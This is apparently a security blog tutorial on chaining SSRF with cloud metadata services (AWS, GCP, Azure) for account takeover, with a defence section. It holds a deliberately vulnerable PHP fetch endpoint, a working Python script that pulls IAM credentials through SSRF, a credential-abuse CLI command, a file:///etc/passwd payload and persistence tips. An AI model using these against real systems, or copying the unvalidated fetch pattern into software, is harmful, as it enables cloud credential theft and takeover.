---
title: "Advanced SSRF: Cloud Metadata Access & Full Account Takeover"
layout: post
tags: [ssrf, cloud security, hacking, cybersecurity, exploit]
image: /assets/images/ssrf_metadata.png
---

# Comprehensive Advanced SSRF Chaining with Cloud Metadata Access and Full Account Takeover

## Introduction

Server-Side Request Forgery (SSRF) is a highly critical vulnerability in modern web applications and APIs. It allows attackers to coerce a vulnerable server into sending crafted requests to internal or external systems. Alone, SSRF can seem moderate in risk, but when combined with cloud metadata services, it can escalate into a **full cloud account takeover**, giving attackers temporary or even persistent credentials to exfiltrate data, manipulate cloud resources, or move laterally.

This document provides a highly detailed technical deep dive into SSRF exploitation, cloud metadata mechanics, chaining techniques, advanced attack vectors, credential management, and practical exploit scripts suitable for lab environments.

---

## 1. SSRF Fundamentals and Internal Mechanics

SSRF occurs when user input is unsafely passed to server-side HTTP requests. Attackers leverage this to reach services that are normally restricted.

### Vulnerable PHP Endpoint Example
```php
<?php
$url = $_GET['url'];
$response = file_get_contents($url);
echo $response;
?>
```
- `$url` is unfiltered and unvalidated.
- Attackers can direct requests to internal resources or metadata endpoints.

### SSRF Technical Details
- **Protocols**: HTTP, HTTPS, file, gopher, FTP, and others.
- **Redirect Handling**: 301/302 responses may allow attackers to reach otherwise restricted endpoints.
- **Local and Private Network Access**: 127.0.0.1, 169.254.169.254, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.
- **DNS Rebinding & Subdomain Takeover**: Attackers can use domains that resolve to internal IPs to bypass network restrictions.
- **HTTP Verb Manipulation**: GET-only endpoints can be exploited using POST, PUT, or other HTTP methods.
- **Timing and Rate Limiting**: Bypassing server-side protections by carefully timed requests.

### Request Flow Analysis
1. User provides input to server.
2. Server constructs a request using the input.
3. Request is sent through internal networking stack.
4. Response is returned to the attacker if output is unfiltered.

---

## 2. Cloud Metadata Services Explained

Cloud instances expose metadata services for instance configuration, role credentials, and security information.

### AWS Metadata Service
- **IP**: 169.254.169.254
- **IAM Endpoint**: `/latest/meta-data/iam/security-credentials/`
- **Data Provided**:
  - `RoleName`
  - `AccessKeyId`
  - `SecretAccessKey`
  - `Token`
  - `Expiration`
- **Mechanics**: IMDSv1 allows direct access; IMDSv2 requires session tokens and PUT requests to establish a session.

### GCP Metadata Service
- **IP**: 169.254.169.254
- **Header Required**: `Metadata-Flavor: Google`
- **Endpoint**: `/computeMetadata/v1/instance/service-accounts/default/token`
- **Mechanics**: Provides OAuth tokens scoped to the service account of the instance.

### Azure Metadata Service
- **IP**: 169.254.169.254
- **Header Required**: `Metadata: true`
- **Endpoint**: `/metadata/instance`
- **Mechanics**: Supplies temporary managed identity credentials and instance configuration.

### Detailed Credential Mechanics
- Temporary credentials have TTLs ranging from minutes to hours.
- Permissions are inherited from the role/service account.
- Attackers using SSRF can obtain these credentials remotely if the endpoint is unprotected.

---

## 3. SSRF Chaining with Metadata Access

Step-by-step chained attack:

1. **Locate SSRF Vulnerability**: Identify endpoints where server requests are made based on user input.
2. **Direct SSRF to Metadata Endpoint**: 
   ```
   http://vulnerable-app/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```
3. **Retrieve Role Name**: The server fetches the role name from metadata.
4. **Extract Temporary Credentials**:
   ```json
   {
     "AccessKeyId": "FAKEACCESSKEY123",
     "SecretAccessKey": "FAKESECRETKEY456",
     "Token": "FAKETOKEN789"
   }
   ```
5. **Exploit Credentials**: Use SDKs or CLI tools to access cloud resources with permissions of the role.

### Credential Flow Analysis
- Server fetches credentials internally.
- SSRF returns them to the attacker.
- Attackers can perform actions such as:
  - S3 bucket listing, reading, writing
  - EC2 instance management
  - IAM role modification
  - Cross-service lateral movement

---

## 4. Advanced Exploit Examples

### Python SSRF Exploit
```python
import requests

TARGET = "http://localhost/fetch.php?url="
METADATA_BASE = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 1: Get role name
role_name = requests.get(TARGET + METADATA_BASE).text.strip()
print(f"Role Name: {role_name}")

# Step 2: Retrieve credentials
creds = requests.get(TARGET + METADATA_BASE + role_name).json()
print("AccessKey:", creds["AccessKeyId"])
print("SecretKey:", creds["SecretAccessKey"])
print("Token:", creds["Token"])
```

### AWS CLI Usage
```bash
aws s3 ls \
    --access-key FAKEACCESSKEY123 \
    --secret-key FAKESECRETKEY456 \
    --session-token FAKETOKEN789
```
- List buckets, manipulate EC2 instances, explore IAM permissions.

### Multi-step Exploitation
1. Exploit SSRF to access internal admin dashboards.
2. Combine with SSTI to retrieve configuration files.
3. Use leaked API keys to access additional cloud services.
4. Rotate or create IAM roles for persistence.

---

## 5. Advanced SSRF Techniques

1. **Protocol Abuse**: HTTP, HTTPS, file, gopher, FTP.
2. **Local File Inclusion (LFI)**: e.g., `file:///etc/passwd`.
3. **Raw TCP via Gopher**: Craft low-level HTTP requests.
4. **Redirect Chains**: Exploit 301/302 redirects to bypass network restrictions.
5. **DNS Rebinding**: Use attacker-controlled domains to map to internal IPs.
6. **Header Manipulation**: Required for metadata endpoints (GCP, Azure).
7. **Timing Attacks & Rate Limiting Bypass**: Evade request limits to access credentials.

---

## 6. Risk Assessment

- Temporary credentials provide high-level access.
- Chained SSRF can escalate to **full cloud account takeover**.
- Potential impact includes:
  - Data exfiltration
  - Resource manipulation
  - IAM escalation
  - Persistent lateral movement
  - Cross-service exploitation

---

## 7. Defense Strategies

1. **Input Validation and Whitelisting**: Limit allowed URL patterns; block metadata and private IP ranges.
2. **Metadata Service Hardening**: IMDSv2 enforcement (AWS), headers required (GCP/Azure).
3. **Strict IAM Policies**: Least privilege, short-lived credentials, minimal role permissions.
4. **Monitoring and Logging**: CloudTrail, GuardDuty, anomalous activity alerts.
5. **Rate Limiting & Request Filtering**: Prevent automated SSRF attempts.
6. **Internal Segmentation**: Limit server access to sensitive internal services.

---

## 8. Conclusion

SSRF combined with cloud metadata access is a critical attack vector. Attackers can escalate from a minor SSRF vulnerability to full cloud account compromise. Advanced exploitation, chaining techniques, and multi-step attacks amplify risk. Strong input validation, metadata protection, least privilege IAM policies, and monitoring are essential defenses.

**Disclaimer:** All examples are for lab and educational purposes only; do not attempt on production environments.

---


<div class="share-buttons">
  <p>Share this post:</p>
  <a class="share-btn twitter" href="https://twitter.com/intent/tweet?text=Advanced SSRF: Cloud Metadata Access & Full Account Takeover&url={{ page.url | absolute_url }}" target="_blank">Twitter</a>
  <a class="share-btn facebook" href="https://www.facebook.com/sharer/sharer.php?u={{ page.url | absolute_url }}" target="_blank">Facebook</a>
  <a class="share-btn reddit" href="https://www.reddit.com/submit?url={{ page.url | absolute_url }}&title=Advanced SSRF: Cloud Metadata Access & Full Account Takeover" target="_blank">Reddit</a>
</div>

<style>
.share-buttons {
  margin-top: 30px;
  font-family: sans-serif;
}
.share-buttons p {
  margin-bottom: 8px;
  font-weight: bold;
}
.share-buttons .share-btn {
  display: inline-block;
  margin-right: 8px;
  padding: 8px 14px;
  color: #fff;
  text-decoration: none;
  border-radius: 5px;
  font-size: 14px;
  transition: opacity 0.2s;
}
.share-buttons .share-btn:hover {
  opacity: 0.8;
}
.share-buttons .twitter { background: #1da1f2; }
.share-buttons .facebook { background: #4267B2; }
.share-buttons .reddit { background: #ff4500; }
</style>
<!-- Share Buttons End -->

## 📺 Video Demonstration

<iframe width="100%" height="500" src="https://www.youtube.com/embed/4k0n9AwtIuY" title="Advanced SSRF Exploitation: Cloud Metadata & Full Account Takeover Tutorial" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
